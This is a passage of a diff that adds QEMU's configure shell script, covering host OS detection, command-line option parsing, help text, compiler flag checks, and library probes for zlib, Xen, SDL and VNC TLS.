+    exit 1
+  ;;
+esac
+
+# OS specific
+if check_define __linux__ ; then
+  targetos="Linux"
+elif check_define _WIN32 ; then
+  targetos='MINGW32'
+elif check_define __OpenBSD__ ; then
+  targetos='OpenBSD'
+elif check_define __sun__ ; then
+  targetos='SunOS'
+elif check_define __HAIKU__ ; then
+  targetos='Haiku'
+else
+  targetos=`uname -s`
+fi
+
+case $targetos in
+CYGWIN*)
+  mingw32="yes"
+  QEMU_CFLAGS="-mno-cygwin $QEMU_CFLAGS"
+  audio_possible_drivers="winwave sdl"
+  audio_drv_list="winwave"
+;;
+MINGW32*)
+  mingw32="yes"
+  audio_possible_drivers="winwave dsound sdl fmod"
+  audio_drv_list="winwave"
+;;
+GNU/kFreeBSD)
+  bsd="yes"
+  audio_drv_list="oss"
+  audio_possible_drivers="oss sdl esd pa"
+;;
+FreeBSD)
+  bsd="yes"
+  make="${MAKE-gmake}"
+  audio_drv_list="oss"
+  audio_possible_drivers="oss sdl esd pa"
+  # needed for kinfo_getvmmap(3) in libutil.h
+  LIBS="-lutil $LIBS"
+;;
+DragonFly)
+  bsd="yes"
+  make="${MAKE-gmake}"
+  audio_drv_list="oss"
+  audio_possible_drivers="oss sdl esd pa"
+;;
+NetBSD)
+  bsd="yes"
+  make="${MAKE-gmake}"
+  audio_drv_list="oss"
+  audio_possible_drivers="oss sdl esd"
+  oss_lib="-lossaudio"
+;;
+OpenBSD)
+  bsd="yes"
+  make="${MAKE-gmake}"
+  audio_drv_list="oss"
+  audio_possible_drivers="oss sdl esd"
+  oss_lib="-lossaudio"
+;;
+Darwin)
+  bsd="yes"
+  darwin="yes"
+  # on Leopard most of the system is 32-bit, so we have to ask the kernel it if we can
+  # run 64-bit userspace code
+  if [ "$cpu" = "i386" ] ; then
+    is_x86_64=`sysctl -n hw.optional.x86_64`
+    [ "$is_x86_64" = "1" ] && cpu=x86_64
+  fi
+  if [ "$cpu" = "x86_64" ] ; then
+    QEMU_CFLAGS="-arch x86_64 $QEMU_CFLAGS"
+    LDFLAGS="-arch x86_64 $LDFLAGS"
+  else
+    QEMU_CFLAGS="-mdynamic-no-pic $QEMU_CFLAGS"
+  fi
+  darwin_user="yes"
+  cocoa="yes"
+  audio_drv_list="coreaudio"
+  audio_possible_drivers="coreaudio sdl fmod"
+  LDFLAGS="-framework CoreFoundation -framework IOKit $LDFLAGS"
+  libs_softmmu="-F/System/Library/Frameworks -framework Cocoa -framework IOKit $libs_softmmu"
+;;
+SunOS)
+  solaris="yes"
+  make="${MAKE-gmake}"
+  install="${INSTALL-ginstall}"
+  ld="gld"
+  needs_libsunmath="no"
+  solarisrev=`uname -r | cut -f2 -d.`
+  # have to select again, because `uname -m` returns i86pc
+  # even on an x86_64 box.
+  solariscpu=`isainfo -k`
+  if test "${solariscpu}" = "amd64" ; then
+    cpu="x86_64"
+  fi
+  if [ "$cpu" = "i386" -o "$cpu" = "x86_64" ] ; then
+    if test "$solarisrev" -le 9 ; then
+      if test -f /opt/SUNWspro/prod/lib/libsunmath.so.1; then
+        needs_libsunmath="yes"
+        QEMU_CFLAGS="-I/opt/SUNWspro/prod/include/cc $QEMU_CFLAGS"
+        LDFLAGS="-L/opt/SUNWspro/prod/lib -R/opt/SUNWspro/prod/lib $LDFLAGS"
+        LIBS="-lsunmath $LIBS"
+      else
+        echo "QEMU will not link correctly on Solaris 8/X86 or 9/x86 without"
+        echo "libsunmath from the Sun Studio compilers tools, due to a lack of"
+        echo "C99 math features in libm.so in Solaris 8/x86 and Solaris 9/x86"
+        echo "Studio 11 can be downloaded from www.sun.com."
+        exit 1
+      fi
+    fi
+  fi
+  if test -f /usr/include/sys/soundcard.h ; then
+    audio_drv_list="oss"
+  fi
+  audio_possible_drivers="oss sdl"
+# needed for CMSG_ macros in sys/socket.h
+  QEMU_CFLAGS="-D_XOPEN_SOURCE=600 $QEMU_CFLAGS"
+# needed for TIOCWIN* defines in termios.h
+  QEMU_CFLAGS="-D__EXTENSIONS__ $QEMU_CFLAGS"
+  QEMU_CFLAGS="-std=gnu99 $QEMU_CFLAGS"
+  LIBS="-lsocket -lnsl -lresolv $LIBS"
+;;
+AIX)
+  aix="yes"
+  make="${MAKE-gmake}"
+;;
+Haiku)
+  haiku="yes"
+  QEMU_CFLAGS="-DB_USE_POSITIVE_POSIX_ERRORS $QEMU_CFLAGS"
+  LIBS="-lposix_error_mapper -lnetwork $LIBS"
+;;
+*)
+  audio_drv_list="oss"
+  audio_possible_drivers="oss alsa sdl esd pa"
+  linux="yes"
+  linux_user="yes"
+  usb="linux"
+  if [ "$cpu" = "i386" -o "$cpu" = "x86_64" ] ; then
+    audio_possible_drivers="$audio_possible_drivers fmod"
+  fi
+  if [ "$cpu" = "ia64" ] ; then
+     xen="no"
+     target_list="ia64-softmmu"
+     cpu_emulation="no"
+     gdbstub="no"
+     slirp="no"
+  fi
+;;
+esac
+
+if [ "$bsd" = "yes" ] ; then
+  if [ "$darwin" != "yes" ] ; then
+    usb="bsd"
+  fi
+  bsd_user="yes"
+fi
+
+: ${make=${MAKE-make}}
+: ${install=${INSTALL-install}}
+
+if test "$mingw32" = "yes" ; then
+  EXESUF=".exe"
+  QEMU_CFLAGS="-DWIN32_LEAN_AND_MEAN -DWINVER=0x501 $QEMU_CFLAGS"
+  # enable C99/POSIX format strings (needs mingw32-runtime 3.15 or later)
+  QEMU_CFLAGS="-D__USE_MINGW_ANSI_STDIO=1 $QEMU_CFLAGS"
+  LIBS="-lwinmm -lws2_32 -liphlpapi $LIBS"
+  prefix="c:/Program Files/Qemu"
+  mandir="\${prefix}"
+  datadir="\${prefix}"
+  docdir="\${prefix}"
+  bindir="\${prefix}"
+  sysconfdir="\${prefix}"
+  confsuffix=""
+fi
+
+werror=""
+
+for opt do
+  optarg=`expr "x$opt" : 'x[^=]*=\(.*\)'`
+  case "$opt" in
+  --help|-h) show_help=yes
+  ;;
+  --prefix=*) prefix="$optarg"
+  ;;
+  --interp-prefix=*) interp_prefix="$optarg"
+  ;;
+  --source-path=*)
+  ;;
+  --cross-prefix=*)
+  ;;
+  --cc=*)
+  ;;
+  --host-cc=*) host_cc="$optarg"
+  ;;
+  --make=*) make="$optarg"
+  ;;
+  --install=*) install="$optarg"
+  ;;
+  --extra-cflags=*)
+  ;;
+  --extra-ldflags=*)
+  ;;
+  --cpu=*)
+  ;;
+  --target-list=*) target_list="$optarg"
+  ;;
+  --enable-trace-backend=*) trace_backend="$optarg"
+  ;;
+  --with-trace-file=*) trace_file="$optarg"
+  ;;
+  --enable-gprof) gprof="yes"
+  ;;
+  --static)
+    static="yes"
+    LDFLAGS="-static $LDFLAGS"
+  ;;
+  --mandir=*) mandir="$optarg"
+  ;;
+  --bindir=*) bindir="$optarg"
+  ;;
+  --datadir=*) datadir="$optarg"
+  ;;
+  --docdir=*) docdir="$optarg"
+  ;;
+  --sysconfdir=*) sysconfdir="$optarg"
+  ;;
+  --disable-sdl) sdl="no"
+  ;;
+  --enable-sdl) sdl="yes"
+  ;;
+  --fmod-lib=*) fmod_lib="$optarg"
+  ;;
+  --fmod-inc=*) fmod_inc="$optarg"
+  ;;
+  --oss-lib=*) oss_lib="$optarg"
+  ;;
+  --audio-card-list=*) audio_card_list=`echo "$optarg" | sed -e 's/,/ /g'`
+  ;;
+  --audio-drv-list=*) audio_drv_list="$optarg"
+  ;;
+  --block-drv-whitelist=*) block_drv_whitelist=`echo "$optarg" | sed -e 's/,/ /g'`
+  ;;
+  --enable-debug-tcg) debug_tcg="yes"
+  ;;
+  --disable-debug-tcg) debug_tcg="no"
+  ;;
+  --enable-debug-mon) debug_mon="yes"
+  ;;
+  --disable-debug-mon) debug_mon="no"
+  ;;
+  --enable-debug)
+      # Enable debugging options that aren't excessively noisy
+      debug_tcg="yes"
+      debug_mon="yes"
+      debug="yes"
+      strip_opt="no"
+  ;;
+  --enable-sparse) sparse="yes"
+  ;;
+  --disable-sparse) sparse="no"
+  ;;
+  --disable-strip) strip_opt="no"
+  ;;
+  --disable-vnc-tls) vnc_tls="no"
+  ;;
+  --enable-vnc-tls) vnc_tls="yes"
+  ;;
+  --disable-vnc-sasl) vnc_sasl="no"
+  ;;
+  --enable-vnc-sasl) vnc_sasl="yes"
+  ;;
+  --disable-vnc-jpeg) vnc_jpeg="no"
+  ;;
+  --enable-vnc-jpeg) vnc_jpeg="yes"
+  ;;
+  --disable-vnc-png) vnc_png="no"
+  ;;
+  --enable-vnc-png) vnc_png="yes"
+  ;;
+  --disable-vnc-thread) vnc_thread="no"
+  ;;
+  --enable-vnc-thread) vnc_thread="yes"
+  ;;
+  --disable-slirp) slirp="no"
+  ;;
+  --disable-uuid) uuid="no"
+  ;;
+  --enable-uuid) uuid="yes"
+  ;;
+  --disable-vde) vde="no"
+  ;;
+  --enable-vde) vde="yes"
+  ;;
+  --disable-xen) xen="no"
+  ;;
+  --enable-xen) xen="yes"
+  ;;
+  --disable-brlapi) brlapi="no"
+  ;;
+  --enable-brlapi) brlapi="yes"
+  ;;
+  --disable-bluez) bluez="no"
+  ;;
+  --enable-bluez) bluez="yes"
+  ;;
+  --disable-kvm) kvm="no"
+  ;;
+  --enable-kvm) kvm="yes"
+  ;;
+  --disable-kvm-pit) kvm_cap_pit="no"
+  ;;
+  --enable-kvm-pit) kvm_cap_pit="yes"
+  ;;
+  --disable-kvm-device-assignment) kvm_cap_device_assignment="no"
+  ;;
+  --enable-kvm-device-assignment) kvm_cap_device_assignment="yes"
+  ;;
+  --disable-spice) spice="no"
+  ;;
+  --enable-spice) spice="yes"
+  ;;
+  --enable-profiler) profiler="yes"
+  ;;
+  --enable-cocoa)
+      cocoa="yes" ;
+      sdl="no" ;
+      audio_drv_list="coreaudio `echo $audio_drv_list | sed s,coreaudio,,g`"
+  ;;
+  --disable-system) softmmu="no"
+  ;;
+  --enable-system) softmmu="yes"
+  ;;
+  --disable-user)
+      linux_user="no" ;
+      bsd_user="no" ;
+      darwin_user="no"
+  ;;
+  --enable-user) ;;
+  --disable-linux-user) linux_user="no"
+  ;;
+  --enable-linux-user) linux_user="yes"
+  ;;
+  --disable-darwin-user) darwin_user="no"
+  ;;
+  --enable-darwin-user) darwin_user="yes"
+  ;;
+  --disable-bsd-user) bsd_user="no"
+  ;;
+  --enable-bsd-user) bsd_user="yes"
+  ;;
+  --enable-guest-base) guest_base="yes"
+  ;;
+  --disable-guest-base) guest_base="no"
+  ;;
+  --enable-user-pie) user_pie="yes"
+  ;;
+  --disable-user-pie) user_pie="no"
+  ;;
+  --enable-uname-release=*) uname_release="$optarg"
+  ;;
+  --sparc_cpu=*)
+  ;;
+  --enable-werror) werror="yes"
+  ;;
+  --disable-werror) werror="no"
+  ;;
+  --disable-curses) curses="no"
+  ;;
+  --enable-curses) curses="yes"
+  ;;
+  --disable-curl) curl="no"
+  ;;
+  --enable-curl) curl="yes"
+  ;;
+  --disable-fdt) fdt="no"
+  ;;
+  --enable-fdt) fdt="yes"
+  ;;
+  --disable-check-utests) check_utests="no"
+  ;;
+  --enable-check-utests) check_utests="yes"
+  ;;
+  --disable-nptl) nptl="no"
+  ;;
+  --enable-nptl) nptl="yes"
+  ;;
+  --enable-mixemu) mixemu="yes"
+  ;;
+  --disable-linux-aio) linux_aio="no"
+  ;;
+  --enable-linux-aio) linux_aio="yes"
+  ;;
+  --disable-attr) attr="no"
+  ;;
+  --enable-attr) attr="yes"
+  ;;
+  --enable-io-thread) io_thread="yes"
+  ;;
+  --disable-blobs) blobs="no"
+  ;;
+  --kerneldir=*) kerneldir="$optarg"
+  ;;
+  --with-pkgversion=*) pkgversion=" ($optarg)"
+  ;;
+  --disable-docs) docs="no"
+  ;;
+  --enable-docs) docs="yes"
+  ;;
+  --disable-cpu-emulation) cpu_emulation="no"
+  ;;
+  --disable-vhost-net) vhost_net="no"
+  ;;
+  --enable-vhost-net) vhost_net="yes"
+  ;;
+  --*dir)
+  ;;
+  --disable-rbd) rbd="no"
+  ;;
+  --enable-rbd) rbd="yes"
+  ;;
+  *) echo "ERROR: unknown option $opt"; show_help="yes"
+  ;;
+  esac
+done
+
+#
+# If cpu ~= sparc and  sparc_cpu hasn't been defined, plug in the right
+# QEMU_CFLAGS/LDFLAGS (assume sparc_v8plus for 32-bit and sparc_v9 for 64-bit)
+#
+host_guest_base="no"
+case "$cpu" in
+    sparc) case $sparc_cpu in
+           v7|v8)
+             QEMU_CFLAGS="-mcpu=${sparc_cpu} -D__sparc_${sparc_cpu}__ $QEMU_CFLAGS"
+           ;;
+           v8plus|v8plusa)
+             QEMU_CFLAGS="-mcpu=ultrasparc -D__sparc_${sparc_cpu}__ $QEMU_CFLAGS"
+           ;;
+           *) # sparc_cpu not defined in the command line
+             QEMU_CFLAGS="-mcpu=ultrasparc -D__sparc_v8plus__ $QEMU_CFLAGS"
+           esac
+           LDFLAGS="-m32 $LDFLAGS"
+           QEMU_CFLAGS="-m32 -ffixed-g2 -ffixed-g3 $QEMU_CFLAGS"
+           if test "$solaris" = "no" ; then
+             QEMU_CFLAGS="-ffixed-g1 -ffixed-g6 $QEMU_CFLAGS"
+             helper_cflags="-ffixed-i0"
+           fi
+           ;;
+    sparc64)
+           QEMU_CFLAGS="-m64 -mcpu=ultrasparc -D__sparc_v9__ $QEMU_CFLAGS"
+           LDFLAGS="-m64 $LDFLAGS"
+           QEMU_CFLAGS="-ffixed-g5 -ffixed-g6 -ffixed-g7 $QEMU_CFLAGS"
+           if test "$solaris" != "no" ; then
+             QEMU_CFLAGS="-ffixed-g1 $QEMU_CFLAGS"
+           fi
+           ;;
+    s390)
+           QEMU_CFLAGS="-m31 -march=z990 $QEMU_CFLAGS"
+           LDFLAGS="-m31 $LDFLAGS"
+           host_guest_base="yes"
+           ;;
+    s390x)
+           QEMU_CFLAGS="-m64 -march=z990 $QEMU_CFLAGS"
+           LDFLAGS="-m64 $LDFLAGS"
+           host_guest_base="yes"
+           ;;
+    i386)
+           QEMU_CFLAGS="-m32 $QEMU_CFLAGS"
+           LDFLAGS="-m32 $LDFLAGS"
+           cc_i386='$(CC) -m32'
+           helper_cflags="-fomit-frame-pointer"
+           host_guest_base="yes"
+           ;;
+    x86_64)
+           QEMU_CFLAGS="-m64 $QEMU_CFLAGS"
+           LDFLAGS="-m64 $LDFLAGS"
+           cc_i386='$(CC) -m32'
+           host_guest_base="yes"
+           ;;
+    arm*)
+           host_guest_base="yes"
+           ;;
+    ppc*)
+           host_guest_base="yes"
+           ;;
+    mips*)
+           host_guest_base="yes"
+           ;;
+    ia64*)
+           host_guest_base="yes"
+           ;;
+    hppa*)
+           host_guest_base="yes"
+           ;;
+esac
+
+[ -z "$guest_base" ] && guest_base="$host_guest_base"
+
+if test x"$show_help" = x"yes" ; then
+cat << EOF
+
+Usage: configure [options]
+Options: [defaults in brackets after descriptions]
+
+EOF
+echo "Standard options:"
+echo "  --help                   print this message"
+echo "  --prefix=PREFIX          install in PREFIX [$prefix]"
+echo "  --interp-prefix=PREFIX   where to find shared libraries, etc."
+echo "                           use %M for cpu name [$interp_prefix]"
+echo "  --target-list=LIST       set target list [$target_list]"
+echo ""
+echo "Advanced options (experts only):"
+echo "  --source-path=PATH       path of source code [$source_path]"
+echo "  --cross-prefix=PREFIX    use PREFIX for compile tools [$cross_prefix]"
+echo "  --cc=CC                  use C compiler CC [$cc]"
+echo "  --host-cc=CC             use C compiler CC [$host_cc] for code run at"
+echo "                           build time"
+echo "  --extra-cflags=CFLAGS    append extra C compiler flags QEMU_CFLAGS"
+echo "  --extra-ldflags=LDFLAGS  append extra linker flags LDFLAGS"
+echo "  --make=MAKE              use specified make [$make]"
+echo "  --install=INSTALL        use specified install [$install]"
+echo "  --static                 enable static build [$static]"
+echo "  --mandir=PATH            install man pages in PATH"
+echo "  --datadir=PATH           install firmware in PATH"
+echo "  --docdir=PATH            install documentation in PATH"
+echo "  --bindir=PATH            install binaries in PATH"
+echo "  --sysconfdir=PATH        install config in PATH/qemu"
+echo "  --enable-debug-tcg       enable TCG debugging"
+echo "  --disable-debug-tcg      disable TCG debugging (default)"
+echo "  --enable-debug           enable common debug build options"
+echo "  --enable-sparse          enable sparse checker"
+echo "  --disable-sparse         disable sparse checker (default)"
+echo "  --disable-strip          disable stripping binaries"
+echo "  --disable-werror         disable compilation abort on warning"
+echo "  --disable-sdl            disable SDL"
+echo "  --enable-sdl             enable SDL"
+echo "  --enable-cocoa           enable COCOA (Mac OS X only)"
+echo "  --audio-drv-list=LIST    set audio drivers list:"
+echo "                           Available drivers: $audio_possible_drivers"
+echo "  --audio-card-list=LIST   set list of emulated audio cards [$audio_card_list]"
+echo "                           Available cards: $audio_possible_cards"
+echo "  --block-drv-whitelist=L  set block driver whitelist"
+echo "                           (affects only QEMU, not qemu-img)"
+echo "  --enable-mixemu          enable mixer emulation"
+echo "  --disable-xen            disable xen backend driver support"
+echo "  --enable-xen             enable xen backend driver support"
+echo "  --disable-brlapi         disable BrlAPI"
+echo "  --enable-brlapi          enable BrlAPI"
+echo "  --disable-vnc-tls        disable TLS encryption for VNC server"
+echo "  --enable-vnc-tls         enable TLS encryption for VNC server"
+echo "  --disable-vnc-sasl       disable SASL encryption for VNC server"
+echo "  --enable-vnc-sasl        enable SASL encryption for VNC server"
+echo "  --disable-vnc-jpeg       disable JPEG lossy compression for VNC server"
+echo "  --enable-vnc-jpeg        enable JPEG lossy compression for VNC server"
+echo "  --disable-vnc-png        disable PNG compression for VNC server (default)"
+echo "  --enable-vnc-png         enable PNG compression for VNC server"
+echo "  --disable-vnc-thread     disable threaded VNC server"
+echo "  --enable-vnc-thread      enable threaded VNC server"
+echo "  --disable-curses         disable curses output"
+echo "  --enable-curses          enable curses output"
+echo "  --disable-curl           disable curl connectivity"
+echo "  --enable-curl            enable curl connectivity"
+echo "  --disable-fdt            disable fdt device tree"
+echo "  --enable-fdt             enable fdt device tree"
+echo "  --disable-check-utests   disable check unit-tests"
+echo "  --enable-check-utests    enable check unit-tests"
+echo "  --disable-bluez          disable bluez stack connectivity"
+echo "  --enable-bluez           enable bluez stack connectivity"
+echo "  --disable-kvm            disable KVM acceleration support"
+echo "  --enable-kvm             enable KVM acceleration support"
+echo "  --disable-kvm-pit        disable KVM pit support"
+echo "  --enable-kvm-pit         enable KVM pit support"
+echo "  --disable-kvm-device-assignment  disable KVM device assignment support"
+echo "  --enable-kvm-device-assignment   enable KVM device assignment support"
+echo "  --disable-nptl           disable usermode NPTL support"
+echo "  --enable-nptl            enable usermode NPTL support"
+echo "  --enable-system          enable all system emulation targets"
+echo "  --disable-system         disable all system emulation targets"
+echo "  --enable-user            enable supported user emulation targets"
+echo "  --disable-user           disable all user emulation targets"
+echo "  --enable-linux-user      enable all linux usermode emulation targets"
+echo "  --disable-linux-user     disable all linux usermode emulation targets"
+echo "  --enable-darwin-user     enable all darwin usermode emulation targets"
+echo "  --disable-darwin-user    disable all darwin usermode emulation targets"
+echo "  --enable-bsd-user        enable all BSD usermode emulation targets"
+echo "  --disable-bsd-user       disable all BSD usermode emulation targets"
+echo "  --enable-guest-base      enable GUEST_BASE support for usermode"
+echo "                           emulation targets"
+echo "  --disable-guest-base     disable GUEST_BASE support"
+echo "  --enable-user-pie        build usermode emulation targets as PIE"
+echo "  --disable-user-pie       do not build usermode emulation targets as PIE"
+echo "  --fmod-lib               path to FMOD library"
+echo "  --fmod-inc               path to FMOD includes"
+echo "  --oss-lib                path to OSS library"
+echo "  --enable-uname-release=R Return R for uname -r in usermode emulation"
+echo "  --sparc_cpu=V            Build qemu for Sparc architecture v7, v8, v8plus, v8plusa, v9"
+echo "  --disable-uuid           disable uuid support"
+echo "  --enable-uuid            enable uuid support"
+echo "  --disable-vde            disable support for vde network"
+echo "  --enable-vde             enable support for vde network"
+echo "  --disable-linux-aio      disable Linux AIO support"
+echo "  --enable-linux-aio       enable Linux AIO support"
+echo "  --disable-attr           disables attr and xattr support"
+echo "  --enable-attr            enable attr and xattr support"
+echo "  --enable-io-thread       enable IO thread"
+echo "  --disable-blobs          disable installing provided firmware blobs"
+echo "  --kerneldir=PATH         look for kernel includes in PATH"
+echo "  --disable-cpu-emulation  disables use of qemu cpu emulation code"
+echo "  --enable-docs            enable documentation build"
+echo "  --disable-docs           disable documentation build"
+echo "  --disable-vhost-net      disable vhost-net acceleration support"
+echo "  --enable-vhost-net       enable vhost-net acceleration support"
+echo "  --enable-trace-backend=B Set trace backend"
+echo "                           Available backends:" $("$source_path"/scripts/tracetool --list-backends)
+echo "  --with-trace-file=NAME   Full PATH,NAME of file to store traces"
+echo "                           Default:trace-<pid>"
+echo "  --disable-spice          disable spice"
+echo "  --enable-spice           enable spice"
+echo "  --enable-rbd             enable building the rados block device (rbd)"
+echo ""
+echo "NOTE: The object files are built at the place where configure is launched"
+exit 1
+fi
+
+# check that the C compiler works.
+cat > $TMPC <<EOF
+int main(void) {}
+EOF
+
+if compile_object ; then
+  : C compiler works ok
+else
+    echo "ERROR: \"$cc\" either does not exist or does not work"
+    exit 1
+fi
+
+gcc_flags="-Wold-style-declaration -Wold-style-definition -Wtype-limits"
+gcc_flags="-Wformat-security -Wformat-y2k -Winit-self -Wignored-qualifiers $gcc_flags"
+gcc_flags="-Wmissing-include-dirs -Wempty-body -Wnested-externs $gcc_flags"
+gcc_flags="-fstack-protector-all $gcc_flags"
+cat > $TMPC << EOF
+int main(void) { return 0; }
+EOF
+for flag in $gcc_flags; do
+    if compile_prog "-Werror $QEMU_CFLAGS" "-Werror $flag" ; then
+	QEMU_CFLAGS="$QEMU_CFLAGS $flag"
+    fi
+done
+
+#
+# Solaris specific configure tool chain decisions
+#
+if test "$solaris" = "yes" ; then
+  if has $install; then
+    :
+  else
+    echo "Solaris install program not found. Use --install=/usr/ucb/install or"
+    echo "install fileutils from www.blastwave.org using pkg-get -i fileutils"
+    echo "to get ginstall which is used by default (which lives in /opt/csw/bin)"
+    exit 1
+  fi
+  if test "`path_of $install`" = "/usr/sbin/install" ; then
+    echo "Error: Solaris /usr/sbin/install is not an appropriate install program."
+    echo "try ginstall from the GNU fileutils available from www.blastwave.org"
+    echo "using pkg-get -i fileutils, or use --install=/usr/ucb/install"
+    exit 1
+  fi
+  if has ar; then
+    :
+  else
+    echo "Error: No path includes ar"
+    if test -f /usr/ccs/bin/ar ; then
+      echo "Add /usr/ccs/bin to your path and rerun configure"
+    fi
+    exit 1
+  fi
+fi
+
+
+if test -z "$target_list" ; then
+# these targets are portable
+    if [ "$softmmu" = "yes" ] ; then
+        target_list="\
+i386-softmmu \
+x86_64-softmmu \
+arm-softmmu \
+cris-softmmu \
+m68k-softmmu \
+microblaze-softmmu \
+mips-softmmu \
+mipsel-softmmu \
+mips64-softmmu \
+mips64el-softmmu \
+ppc-softmmu \
+ppcemb-softmmu \
+ppc64-softmmu \
+sh4-softmmu \
+sh4eb-softmmu \
+sparc-softmmu \
+sparc64-softmmu \
+"
+    fi
+# the following are Linux specific
+    if [ "$linux_user" = "yes" ] ; then
+        target_list="${target_list}\
+i386-linux-user \
+x86_64-linux-user \
+alpha-linux-user \
+arm-linux-user \
+armeb-linux-user \
+cris-linux-user \
+m68k-linux-user \
+microblaze-linux-user \
+mips-linux-user \
+mipsel-linux-user \
+ppc-linux-user \
+ppc64-linux-user \
+ppc64abi32-linux-user \
+sh4-linux-user \
+sh4eb-linux-user \
+sparc-linux-user \
+sparc64-linux-user \
+sparc32plus-linux-user \
+"
+    fi
+# the following are Darwin specific
+    if [ "$darwin_user" = "yes" ] ; then
+        target_list="$target_list i386-darwin-user ppc-darwin-user "
+    fi
+# the following are BSD specific
+    if [ "$bsd_user" = "yes" ] ; then
+        target_list="${target_list}\
+i386-bsd-user \
+x86_64-bsd-user \
+sparc-bsd-user \
+sparc64-bsd-user \
+"
+    fi
+else
+    target_list=`echo "$target_list" | sed -e 's/,/ /g'`
+fi
+if test -z "$target_list" ; then
+    echo "No targets enabled"
+    exit 1
+fi
+# see if system emulation was really requested
+case " $target_list " in
+  *"-softmmu "*) softmmu=yes
+  ;;
+  *) softmmu=no
+  ;;
+esac
+
+feature_not_found() {
+  feature=$1
+
+  echo "ERROR"
+  echo "ERROR: User requested feature $feature"
+  echo "ERROR: configure was not able to find it"
+  echo "ERROR"
+  exit 1;
+}
+
+if test -z "$cross_prefix" ; then
+
+# ---
+# big/little endian test
+cat > $TMPC << EOF
+#include <inttypes.h>
+int main(int argc, char ** argv){
+        volatile uint32_t i=0x01234567;
+        return (*((uint8_t*)(&i))) == 0x67;
+}
+EOF
+
+if compile_prog "" "" ; then
+$TMPE && bigendian="yes"
+else
+echo big/little test failed
+fi
+
+else
+
+# if cross compiling, cannot launch a program, so make a static guess
+case "$cpu" in
+  armv4b|hppa|m68k|mips|mips64|ppc|ppc64|s390|s390x|sparc|sparc64)
+    bigendian=yes
+  ;;
+esac
+
+fi
+
+# host long bits test, actually a pointer size test
+cat > $TMPC << EOF
+int sizeof_pointer_is_8[sizeof(void *) == 8 ? 1 : -1];
+EOF
+if compile_object; then
+hostlongbits=64
+else
+hostlongbits=32
+fi
+
+
+##########################################
+# NPTL probe
+
+if test "$nptl" != "no" ; then
+  cat > $TMPC <<EOF
+#include <sched.h>
+#include <linux/futex.h>
+void foo()
+{
+#if !defined(CLONE_SETTLS) || !defined(FUTEX_WAIT)
+#error bork
+#endif
+}
+EOF
+
+  if compile_object ; then
+    nptl=yes
+  else
+    if test "$nptl" = "yes" ; then
+      feature_not_found "nptl"
+    fi
+    nptl=no
+  fi
+fi
+
+##########################################
+# zlib check
+
+cat > $TMPC << EOF
+#include <zlib.h>
+int main(void) { zlibVersion(); return 0; }
+EOF
+if compile_prog "" "-lz" ; then
+    :
+else
+    echo
+    echo "Error: zlib check failed"
+    echo "Make sure to have the zlib libs and headers installed."
+    echo
+    exit 1
+fi
+
+##########################################
+# xen probe
+
+if test "$xen" != "no" ; then
+  xen_libs="-lxenstore -lxenctrl -lxenguest"
+  cat > $TMPC <<EOF
+#include <xenctrl.h>
+#include <xs.h>
+int main(void) { xs_daemon_open(); xc_interface_open(); return 0; }
+EOF
+  if compile_prog "" "$xen_libs" ; then
+    xen=yes
+    libs_softmmu="$xen_libs $libs_softmmu"
+  else
+    if test "$xen" = "yes" ; then
+      feature_not_found "xen"
+    fi
+    xen=no
+  fi
+fi
+
+##########################################
+# pkg-config probe
+
+if ! has $pkg_config; then
+  echo warning: proceeding without "$pkg_config" >&2
+  pkg_config=/bin/false
+fi
+
+##########################################
+# Sparse probe
+if test "$sparse" != "no" ; then
+  if has cgcc; then
+    sparse=yes
+  else
+    if test "$sparse" = "yes" ; then
+      feature_not_found "sparse"
+    fi
+    sparse=no
+  fi
+fi
+
+##########################################
+# SDL probe
+
+# Look for sdl configuration program (pkg-config or sdl-config).  Try
+# sdl-config even without cross prefix, and favour pkg-config over sdl-config.
+if test "`basename $sdl_config`" != sdl-config && ! has ${sdl_config}; then
+  sdl_config=sdl-config
+fi
+
+if $pkg_config sdl --modversion >/dev/null 2>&1; then
+  sdlconfig="$pkg_config sdl"
+  _sdlversion=`$sdlconfig --modversion 2>/dev/null | sed 's/[^0-9]//g'`
+elif has ${sdl_config}; then
+  sdlconfig="$sdl_config"
+  _sdlversion=`$sdlconfig --version | sed 's/[^0-9]//g'`
+else
+  if test "$sdl" = "yes" ; then
+    feature_not_found "sdl"
+  fi
+  sdl=no
+fi
+if test -n "$cross_prefix" && test "`basename $sdlconfig`" = sdl-config; then
+  echo warning: using "\"$sdlconfig\"" to detect cross-compiled sdl >&2
+fi
+
+sdl_too_old=no
+if test "$sdl" != "no" ; then
+  cat > $TMPC << EOF
+#include <SDL.h>
+#undef main /* We don't want SDL to override our main() */
+int main( void ) { return SDL_Init (SDL_INIT_VIDEO); }
+EOF
+  sdl_cflags=`$sdlconfig --cflags 2> /dev/null`
+  if test "$static" = "yes" ; then
+    sdl_libs=`$sdlconfig --static-libs 2>/dev/null`
+  else
+    sdl_libs=`$sdlconfig --libs 2> /dev/null`
+  fi
+  if compile_prog "$sdl_cflags" "$sdl_libs" ; then
+    if test "$_sdlversion" -lt 121 ; then
+      sdl_too_old=yes
+    else
+      if test "$cocoa" = "no" ; then
+        sdl=yes
+      fi
+    fi
+
+    # static link with sdl ? (note: sdl.pc's --static --libs is broken)
+    if test "$sdl" = "yes" -a "$static" = "yes" ; then
+      if test $? = 0 && echo $sdl_libs | grep -- -laa > /dev/null; then
+         sdl_libs="$sdl_libs `aalib-config --static-libs 2>/dev/null`"
+         sdl_cflags="$sdl_cflags `aalib-config --cflags 2>/dev/null`"
+      fi
+      if compile_prog "$sdl_cflags" "$sdl_libs" ; then
+	:
+      else
+        sdl=no
+      fi
+    fi # static link
+  else # sdl not found
+    if test "$sdl" = "yes" ; then
+      feature_not_found "sdl"
+    fi
+    sdl=no
+  fi # sdl compile test
+fi
+
+if test "$sdl" = "yes" ; then
+  cat > $TMPC <<EOF
+#include <SDL.h>
+#if defined(SDL_VIDEO_DRIVER_X11)
+#include <X11/XKBlib.h>
+#else
+#error No x11 support
+#endif
+int main(void) { return 0; }
+EOF
+  if compile_prog "$sdl_cflags" "$sdl_libs" ; then
+    sdl_libs="$sdl_libs -lX11"
+  fi
+  if test "$mingw32" = "yes" ; then
+    sdl_libs="`echo $sdl_libs | sed s/-mwindows//g` -mconsole"
+  fi
+  libs_softmmu="$sdl_libs $libs_softmmu"
+fi
+
+##########################################
+# VNC TLS detection
+if test "$vnc_tls" != "no" ; then
+  cat > $TMPC <<EOF
+#include <gnutls/gnutls.h>
+int main(void) { gnutls_session_t s; gnutls_init(&s, GNUTLS_SERVER); return 0; }
+EOF
+  vnc_tls_cflags=`$pkg_config --cflags gnutls 2> /dev/null`
+  vnc_tls_libs=`$pkg_config --libs gnutls 2> /dev/null`
